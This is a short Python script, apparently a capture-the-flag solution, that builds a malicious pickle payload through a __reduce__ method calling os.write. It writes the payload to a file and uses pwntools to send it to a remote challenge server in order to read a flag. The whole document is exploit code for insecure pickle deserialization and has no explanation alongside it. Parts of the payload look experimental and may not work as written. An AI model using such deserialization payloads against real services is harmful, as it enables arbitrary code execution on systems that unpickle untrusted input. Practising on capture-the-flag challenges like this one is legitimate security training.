#!/usr/bin/python

import pickle
import socket
import os
import time
import subprocess
import sys
import glob
from pwn import *

# s = socket.create_connection(('localhost', 4924))

write = sys.stdout.write

def hi(aa):
  open('flag')

class Ex1(object):
  def __reduce__(self):
    return (os.write, (1,"as"))

class Ex2(object):
  def __reduce_ex__(self, p):
    return (os.write, (1, "flag"))

  #def __reduce__(self):
    #return (os.write, (1, "flag"))

l = (hi, Ex1())

payload = pickle.dumps(l) + "#"

f = open("payload_file", "w")
f.write(payload)
f.close()

p = remote('readflag.eatpwnnosleep.com', 55402)
p.sendline(payload)
p.interactive()
p.close()
